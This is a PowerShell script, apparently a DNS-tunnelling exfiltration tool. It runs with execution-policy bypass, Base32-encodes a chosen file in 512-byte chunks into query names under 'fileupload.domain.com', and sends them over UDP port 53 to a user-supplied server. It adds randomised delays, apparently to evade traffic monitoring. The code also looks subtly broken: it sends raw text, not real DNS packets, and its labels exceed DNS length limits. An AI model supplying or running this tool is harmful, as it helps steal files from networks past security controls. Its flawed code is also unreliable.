# powershell -ExecutionPolicy Bypass -File .\dns_file_uploader.ps1

# Set DNS Server and Domain
$DNS_PORT = 53
$domain = "fileupload.domain.com"  # Domain to use

# Base32 encoding function in PowerShell
function Base32-Encode {
    param (
        [byte[]]$bytes
    )
    
    $alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    $output = ""
    $buffer = 0
    $bitsLeft = 0

    foreach ($byte in $bytes) {
        $buffer = ($buffer -shl 8) -bor $byte
        $bitsLeft += 8

        while ($bitsLeft -ge 5) {
            $bitsLeft -= 5
            $output += $alphabet[($buffer -shr $bitsLeft) -band 31]
        }
    }

    if ($bitsLeft -gt 0) {
        $output += $alphabet[($buffer -shl (5 - $bitsLeft)) -band 31]
    }

    return $output
}

# Function to resolve a DNS name to an IP address if necessary
function Resolve-DnsNameOrIp {
    param (
        [string]$server
    )

    # Check if the input is already a valid IP address
    if ([System.Net.IPAddress]::TryParse($server, [ref]$null)) {
        return $server  # Return the valid IP address as-is
    } else {
        # Attempt to resolve the DNS name to an IP address
        try {
            $resolvedIP = [System.Net.Dns]::GetHostAddresses($server) | Where-Object { $_.AddressFamily -eq 'InterNetwork' }
            if ($resolvedIP.Count -gt 0) {
                return $resolvedIP[0].IPAddressToString  # Return the first resolved IPv4 address
            } else {
                throw "No IPv4 address found for the DNS name."
            }
        } catch {
            Write-Host "Error: Unable to resolve '$server' to an IP address." -ForegroundColor Red
            throw $_  # Re-throw the exception to handle it elsewhere
        }
    }
}

# Function to calculate MD5 hash of a file
function Calculate-MD5 {
    param (
        [string]$filePath
    )

    $md5 = [System.Security.Cryptography.MD5]::Create()
    $fileStream = [System.IO.File]::OpenRead($filePath)
    $hashBytes = $md5.ComputeHash($fileStream)
    $fileStream.Close()

    return [BitConverter]::ToString($hashBytes) -replace '-'
}

# Function to send a DNS query with a random delay
function Send-DNSQuery {
    param (
        [string]$data,
        [string]$server,
        [double]$maxDelay
    )

    try {
        $serverIP = Resolve-DnsNameOrIp -server $server
        $serverEndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($serverIP), $DNS_PORT)
    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
        return
    }

    try {
        $udpClient = New-Object System.Net.Sockets.UdpClient
        $queryBytes = [System.Text.Encoding]::ASCII.GetBytes($data)
        
        $udpClient.Send($queryBytes, $queryBytes.Length, $serverEndPoint)
        $udpClient.Close()

        # Add a random delay between 0.1 seconds and the user-provided maximum delay
        $delay = Get-Random -Minimum 0.1 -Maximum $maxDelay
        Write-Host "Query sent, delaying next query by $([Math]::Round($delay, 2)) seconds."
        Start-Sleep -Seconds $delay
    } catch {
        Write-Host "Error sending DNS query: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Function to send file information (filename, MD5 hash, and chunk count)
function Send-FileInfo {
    param (
        [string]$fileName,
        [string]$fileMD5,
        [int]$totalChunks,
        [string]$server,
        [string]$domain,
        [double]$maxDelay
    )

    # Base32 encode the filename, MD5 hash, and chunk count as strings
    $encodedFileName = Base32-Encode ([System.Text.Encoding]::ASCII.GetBytes($fileName))
    $encodedFileMD5 = Base32-Encode ([System.Text.Encoding]::ASCII.GetBytes($fileMD5))
    $encodedChunkCount = Base32-Encode ([System.Text.Encoding]::ASCII.GetBytes([string]$totalChunks))

    $query = "f.$encodedFileName.$encodedFileMD5.$encodedChunkCount.$domain"
    Write-Host "Sending file info: $fileName, MD5: $fileMD5, Total Chunks: $totalChunks"
    Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
}

# Function to send file in chunks with randomized query sending
function Send-FileChunks {
    param (
        [string]$filePath,
        [string]$server,
        [string]$domain,
        [double]$maxDelay,
        [int]$totalChunks
    )

    $fileStream = [System.IO.File]::OpenRead($filePath)
    $chunkNumber = 0

    while ($chunkNumber -lt $totalChunks) {
        $buffer = New-Object byte[] 512  # Size of each chunk in bytes
        $bytesRead = $fileStream.Read($buffer, 0, 512)
        $encodedChunkData = Base32-Encode $buffer[0..($bytesRead-1)]

        # Display the current chunk number and total chunk count
        Write-Host "Sending chunk $chunkNumber of $totalChunks"

        $query = "c$chunkNumber.$encodedChunkData.$domain"
        Send-DNSQuery -data $query -server $server -maxDelay $maxDelay

        $chunkNumber++
    }

    $fileStream.Close()
}

# Function to signal end of transmission
function Send-EndSignal {
    param (
        [string]$server,
        [string]$domain,
        [double]$maxDelay
    )

    $query = "e.end.$domain"
    Write-Host "Sending end of transmission signal"
    Send-DNSQuery -data $query -server $server -maxDelay $maxDelay
}

# Main function to send the file
function Send-File {
    param (
        [string]$filePath,
        [double]$maxDelay,
        [string]$server
    )

    $filePath = $filePath.Trim('"')  # Remove surrounding quotes if any
    $fileName = [System.IO.Path]::GetFileName($filePath)
    $fileMD5 = Calculate-MD5 -filePath $filePath
    $fileSize = (Get-Item $filePath).Length
    $chunkSize = 512
    $totalChunks = [Math]::Ceiling($fileSize / $chunkSize)

    # First send file info (filename, MD5 hash, and chunk count)
    Send-FileInfo -fileName $fileName -fileMD5 $fileMD5 -totalChunks $totalChunks -server $server -domain $domain -maxDelay $maxDelay

    # Now send file chunks
    Send-FileChunks -filePath $filePath -server $server -domain $domain -maxDelay $maxDelay -totalChunks $totalChunks

    # Signal the end of transmission
    Send-EndSignal -server $server -domain $domain -maxDelay $maxDelay
}

# Example usage of the main function
$filePath = Read-Host "Enter the file path to send"
$server = Read-Host "Enter the DNS name or IP address of the server"
$maxDelay = [double](Read-Host "Enter the maximum delay (in seconds) between queries")
Send-File -filePath $filePath -maxDelay $maxDelay -server $server
